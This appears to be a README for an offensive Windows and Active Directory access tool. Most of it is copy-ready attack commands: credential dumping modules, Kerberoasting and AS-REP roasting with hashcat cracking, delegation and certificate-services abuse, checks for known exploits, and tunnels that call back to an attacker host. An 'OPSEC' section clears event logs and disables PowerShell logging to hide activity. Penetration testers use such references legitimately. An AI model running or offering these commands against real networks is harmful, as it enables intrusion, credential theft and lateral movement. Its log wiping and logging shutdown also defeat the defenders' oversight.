# authfinder-ng

> Multi-Protocol Access Discovery & Command Execution Engine for Windows environments.

Automatically tests credentials across multiple protocols, identifies execution vectors, and generates ready-to-use follow-up commands.

---

## Supported Protocols

`WinRM` · `SMBexec` · `WMI` · `PsExec` · `ATExec` · `MSSQL` · `RDP` · `SSH`

---

## Dependencies

| Tool | Required |
|------|----------|
| netexec (nxc) | ✅ |
| impacket | ✅ |
| evil-winrm | ✅ |
| smbclient | optional |
| ldapsearch | optional |
| certipy-ad | optional |
| xfreerdp3 | optional |

---

## Basic Usage

```bash
./authfinder-ng <TARGET_IP> -u <USERNAME> -p <PASSWORD>
```

**Example:**
```bash
./authfinder-ng 10.82.185.250 -u bitbucket -p littleredbucket
```

---

## Commands Reference

### 🔹 WinRM
```bash
evil-winrm -i <IP> -u '<USER>' -p '<PASS>'
```

### 🔹 SMB Execution
```bash
nxc smb <IP> -u '<USER>' -p '<PASS>' -X '<CMD>' --exec-method smbexec
```

### 🔹 WMI Execution
```bash
nxc wmi <IP> -u '<USER>' -p '<PASS>' -X '<CMD>'
```

### 🔹 RDP
```bash
xfreerdp3 /v:<IP> /u:'<USER>' /p:'<PASS>' /cert:ignore /dynamic-resolution +clipboard
nxc rdp <IP> -u '<USER>' -p '<PASS>' --screenshot --screentime 5
```

---

## Post-Exploitation Commands

### Credential Hunting
```bash
nxc smb <IP> -u '<USER>' -p '<PASS>' -M gpp_password
nxc smb <IP> -u '<USER>' -p '<PASS>' -M gpp_autologin
nxc smb <IP> -u '<USER>' -p '<PASS>' -M dpapi
nxc smb <IP> -u '<USER>' -p '<PASS>' -M winscp
nxc smb <IP> -u '<USER>' -p '<PASS>' -M mobaxterm
nxc smb <IP> -u '<USER>' -p '<PASS>' -M putty
nxc smb <IP> -u '<USER>' -p '<PASS>' -M rdcman
nxc smb <IP> -u '<USER>' -p '<PASS>' -M veeam
nxc smb <IP> -u '<USER>' -p '<PASS>' -M keepass_discover
nxc smb <IP> -u '<USER>' -p '<PASS>' -M keepass_trigger
nxc smb <IP> -u '<USER>' -p '<PASS>' -M spider_plus -o READ_ONLY=true EXCLUDE_EXTS=exe,dll,msi
```

### Host Enumeration
```bash
nxc smb <IP> -u '<USER>' -p '<PASS>' --shares
nxc smb <IP> -u '<USER>' -p '<PASS>' --users
nxc smb <IP> -u '<USER>' -p '<PASS>' --groups
nxc smb <IP> -u '<USER>' -p '<PASS>' --local-groups
nxc smb <IP> -u '<USER>' -p '<PASS>' --sessions
nxc smb <IP> -u '<USER>' -p '<PASS>' --loggedon-users
nxc smb <IP> -u '<USER>' -p '<PASS>' --pass-pol
nxc smb <IP> -u '<USER>' -p '<PASS>' -M enum_av
nxc smb <IP> -u '<USER>' -p '<PASS>' -M enum_dns
nxc smb <IP> -u '<USER>' -p '<PASS>' -M subnets
nxc smb <IP> -u '<USER>' -p '<PASS>' -M security-questions
nxc smb <IP> -u '<USER>' -p '<PASS>' -M spider_plus -o READ_ONLY=true
```

### Active Directory — Kerberoasting
```bash
nxc ldap <IP> -u '<USER>' -p '<PASS>' --kerberoasting kerberoast.txt
impacket-GetUserSPNs '<USER>':'<PASS>'@<IP> -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt   # RC4
hashcat -m 19600 kerberoast.txt /usr/share/wordlists/rockyou.txt   # AES128
hashcat -m 19700 kerberoast.txt /usr/share/wordlists/rockyou.txt   # AES256
```

### Active Directory — AS-REP Roasting
```bash
nxc ldap <IP> -u '<USER>' -p '<PASS>' --asreproast asrep.txt
impacket-GetNPUsers '<USER>':'<PASS>'@<IP> -no-pass -request -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Active Directory — BloodHound
```bash
nxc ldap <IP> -u '<USER>' -p '<PASS>' --bloodhound -c All
nxc ldap <IP> -u '<USER>' -p '<PASS>' --bloodhound -c DCOnly
bloodhound-python -u '<USER>' -p '<PASS>' -d <DOMAIN> -ns <IP> -c All --zip
```

### Active Directory — LDAP Enumeration
```bash
nxc ldap <IP> -u '<USER>' -p '<PASS>' -M get-desc-users
nxc ldap <IP> -u '<USER>' -p '<PASS>' -M MAQ
nxc ldap <IP> -u '<USER>' -p '<PASS>' -M ldap-checker
nxc ldap <IP> -u '<USER>' -p '<PASS>' -M find-computer
nxc ldap <IP> -u '<USER>' -p '<PASS>' -M groupmembership -o USER=<USER>
nxc ldap <IP> -u '<USER>' -p '<PASS>' -M daclread -o TARGET=<USER>
```

### Vulnerability Checks
```bash
nxc smb <IP> -u '<USER>' -p '<PASS>' -M nopac          # CVE-2021-42278/42287
nxc smb <IP> -u '<USER>' -p '<PASS>' -M zerologon       # CVE-2020-1472
nxc smb <IP> -u '<USER>' -p '<PASS>' -M petitpotam      # CVE-2021-36942
nxc smb <IP> -u '<USER>' -p '<PASS>' -M ms17-010        # CVE-2017-0144 EternalBlue
nxc smb <IP> -u '<USER>' -p '<PASS>' -M printnightmare  # CVE-2021-1675/34527
nxc smb <IP> -u '<USER>' -p '<PASS>' -M shadowrdp
nxc smb <IP> -u '<USER>' -p '<PASS>' -M badsuccessor    # CVE-2024-26229
```

### Kerberos / Delegation
```bash
impacket-getTGT '<USER>':'<PASS>'
export KRB5CCNAME=$(ls *.ccache | head -1)
impacket-psexec -k -no-pass 'DOMAIN\<USER>'@<IP>

nxc ldap <IP> -u '<USER>' -p '<PASS>' --trusted-for-delegation
impacket-findDelegation '<USER>':'<PASS>'@<IP>

# RBCD
impacket-addcomputer '<USER>':'<PASS>'@<IP> -computer-name 'EVIL$' -computer-pass 'P@ss123'
impacket-rbcd '<USER>':'<PASS>'@<IP> -action write -delegate-to TARGET$ -delegate-from EVIL$
impacket-getST '<USER>':'<PASS>'@<IP> -spn cifs/TARGET.<DOMAIN> -impersonate Administrator
```

### ADCS (AD Certificate Services)
```bash
nxc ldap <IP> -u '<USER>' -p '<PASS>' -M certipy-find
certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASS>' -target <IP> -vulnerable -stdout
certipy-ad req  -u '<USER>@<DOMAIN>' -p '<PASS>' -target <IP> -ca 'CA-NAME' -template 'TEMPLATE'
certipy-ad auth -pfx user.pfx
impacket-gettgt -pfx-file user.pfx '<USER>'
```

### Pivoting & Tunneling

**Ligolo-ng**
```bash
./ligolo-proxy -selfcert -laddr 0.0.0.0:11601            # attacker
./agent -connect <ATTACKER_IP>:11601 -ignore-cert         # target
sudo ip tuntap add user kali mode tun ligolo && sudo ip link set ligolo up
sudo ip route add 192.168.X.0/24 dev ligolo
```

**Chisel**
```bash
./chisel server -p 8080 --reverse                         # attacker
./chisel client <ATTACKER_IP>:8080 R:socks                # target → SOCKS5 :1080
proxychains nxc smb <SUBNET>/24 -u '<USER>' -p '<PASS>'
```

**SSH Tunneling**
```bash
ssh -D 1080 -N '<USER>'@<IP>             # SOCKS5 dynamic proxy
ssh -L 445:INTERNAL_HOST:445 '<USER>'@<IP>
ssh -R 9001:127.0.0.1:9001 '<USER>'@<IP>
```

---

## ⚠️ OPSEC Reminders

```bash
# Check lockout policy BEFORE spraying
nxc smb <IP> -u '<USER>' -p '<PASS>' --pass-pol

# Check AV before uploading tools
nxc smb <IP> -u '<USER>' -p '<PASS>' -M enum_av

# Clear event logs
wevtutil cl System && wevtutil cl Security && wevtutil cl Application

# Clean temp files
del /f /q C:\Windows\Temp\*.exe C:\Temp\*.bak

# Disable PowerShell script block logging
Set-ItemProperty -Path ... -Name EnableScriptBlockLogging -Value 0
```

---

> **Disclaimer:** For authorized penetration testing and CTF use only.
